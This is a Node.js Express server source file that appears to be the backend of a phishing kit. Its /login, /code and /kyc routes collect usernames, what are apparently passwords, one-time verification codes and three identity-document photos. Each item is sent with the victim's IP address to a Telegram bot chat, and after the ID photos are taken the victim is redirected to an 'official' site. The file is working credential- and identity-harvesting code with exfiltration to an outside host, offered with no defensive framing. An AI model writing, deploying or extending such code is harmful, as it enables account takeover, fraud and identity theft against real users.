const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const FormData = require("form-data");
const sqlite3 = require("sqlite3").verbose();

const app = express();
const upload = multer({ dest: "uploads/" });

// ========== CONFIG ==========
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
const OFFICIAL_SITE = process.env.OFFICIAL_SITE || "https://your-official-website.com";
// ============================

// SQLite DB
const DB_PATH = path.join(__dirname, "data.db");
const db = new sqlite3.Database(DB_PATH);
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY,
    username TEXT UNIQUE,
    email TEXT,
    editable TEXT,
    created_at INTEGER
  )`);
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Helpers
function escapeHtml(str = "") {
  return String(str).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
}

function clientIp(req) {
  const hf = req.headers['x-forwarded-for'];
  if (hf) return hf.split(',')[0].trim();
  return (req.ip || (req.connection && req.connection.remoteAddress) || 'unknown').toString();
}

async function sendTelegramText(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return { ok:false, error:"no_telegram_config" };
  try {
    const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode:"HTML" })
    });
    return await resp.json();
  } catch(err){ console.error(err); return { ok:false, error: err.message || "fetch_failed" }; }
}

async function sendTelegramPhoto(filePath, caption="") {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return { ok:false, error:"no_telegram_config" };
  try {
    const form = new FormData();
    form.append("chat_id", TELEGRAM_CHAT_ID);
    if(caption) form.append("caption", caption);
    form.append("photo", fs.createReadStream(filePath));
    const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method:"POST",
      body: form,
      headers: form.getHeaders ? form.getHeaders() : {}
    });
    return await resp.json();
  } catch(err){ console.error(err); return { ok:false, error: err.message || "photo_send_failed" }; }
}

// ROUTES

// POST /login
app.post("/login", async (req,res)=>{
  try {
    const username = (req.body.username||"").trim();
    const editable = (req.body.editable||"").trim();
    if(!username || !editable) return res.json({ok:false,error:"missing_fields"});
    const ip = clientIp(req);
    const time = new Date().toISOString();

    // Save/update user
    db.get("SELECT id FROM users WHERE username=?",[username],(err,row)=>{
      if(!err){
        if(row && row.id) db.run("UPDATE users SET editable=? WHERE id=?",[editable,row.id]);
        else db.run("INSERT INTO users (username,editable,created_at) VALUES (?,?,?)",[username,editable,Date.now()]);
      }
    });

    const msg = `<b>Login info</b>\n👤 Username: ${escapeHtml(username)}\n✏️ Editable: ${escapeHtml(editable)}\n🌐 IP: ${escapeHtml(ip)}\n🕒 ${time}`;
    const sent = await sendTelegramText(msg);
    if(sent && sent.ok) return res.json({ok:true});
    return res.json({ok:false,error:"telegram_send_failed",detail:sent});

  } catch(err){ console.error(err); return res.json({ok:false,error:"server_error"}); }
});

// POST /code
app.post("/code", async (req,res)=>{
  try {
    const code = (req.body.code||"").trim();
    if(!code) return res.json({ok:false,error:"missing_code"});
    const ip = clientIp(req);
    const time = new Date().toISOString();
    const msg = `<b>Verification code</b>\n🔢 Code: ${escapeHtml(code)}\n🌐 IP: ${escapeHtml(ip)}\n🕒 ${time}`;
    const sent = await sendTelegramText(msg);
    if(sent && sent.ok) return res.json({ok:true});
    return res.json({ok:false,error:"telegram_send_failed",detail:sent});
  } catch(err){ console.error(err); return res.json({ok:false,error:"server_error"}); }
});

// POST /kyc
const kycUpload = upload.fields([{name:"photo1"},{name:"photo2"},{name:"photo3"}]);
app.post("/kyc", kycUpload, async (req,res)=>{
  try{
    const ip = clientIp(req);
    const time = new Date().toISOString();

    const fileInfos = [];
    ["photo1","photo2","photo3"].forEach(name=>{
      if(req.files[name] && req.files[name][0]){
        const p = req.files[name][0].path;
        const label = (req.body[name+"_label"]||name);
        fileInfos.push({path:p,label});
      }
    });

    if(!fileInfos.length) return res.json({ok:false,error:"no_photos_uploaded"});

    for(let i=0;i<fileInfos.length;i++){
      const info = fileInfos[i];
      const fullCaption = `<b>KYC Submission</b>\n🌐 IP: ${escapeHtml(ip)}\n🕒 ${time}\n${escapeHtml(info.label)} — Photo ${i+1} of ${fileInfos.length}`;
      const sent = await sendTelegramPhoto(path.join(__dirname,info.path), fullCaption);
      fs.unlink(info.path,()=>{}); // delete temp file
      if(!sent || !sent.ok) return res.json({ok:false,error:"telegram_photo_failed",detail:sent});
    }

    return res.json({ok:true,redirect:OFFICIAL_SITE});
  } catch(err){ console.error(err); return res.json({ok:false,error:"server_error"}); }
});

app.get("/health",(req,res)=>res.json({ok:true}));

const PORT = process.env.PORT || 3000;
app.listen(PORT,()=>console.log(`Server running on port ${PORT}`));